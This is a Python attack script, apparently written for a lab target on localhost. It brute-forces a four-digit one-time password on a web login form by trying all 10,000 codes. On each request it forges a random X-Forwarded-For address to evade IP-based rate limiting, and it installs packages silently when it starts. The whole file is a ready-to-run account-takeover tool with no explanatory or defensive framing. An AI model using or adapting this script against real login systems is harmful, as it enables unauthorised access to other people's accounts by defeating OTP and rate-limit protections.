import subprocess
subprocess.call(["pip3", "install", "pyfiglet", "requests"])
import requests
import struct
import random
import pyfiglet
import socket

print(pyfiglet.figlet_format("War Machine"))

def generate_unique_ipv4(existing_ips):
    while True:
        ipv4_address = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xFFFFFFFF)))
        if ipv4_address not in existing_ips:
            existing_ips.add(ipv4_address)
            return ipv4_address

unique_ips = set()

url = 'http://localhost:4000/index.php'

headers = {
    'Host': 'localhost:4000',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://localhost:4000',
    'Connection': 'close',
    'Referer': 'http://localhost:4000',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1'
}

phone_number = input("[+] Enter the target's email: ")
print()
print("Processing ...")
for i in range(10000):
    otp = '{:04d}'.format(i)
    ipv4_address = generate_unique_ipv4(unique_ips)
    headers["X-Forwarded-For"] = str(ipv4_address)
    response = requests.post(url, headers=headers, data={"phone": f"{phone_number}", "otp": f"{otp}"})
    
    if "User not exist or OTP is wrong" in response.text:
        print(f"[-] Login Failed! {otp} isn't the correct OTP \n")
    else:
        print(f"[+] Login Successful! Found the target's OTP: {otp} \n")
        break
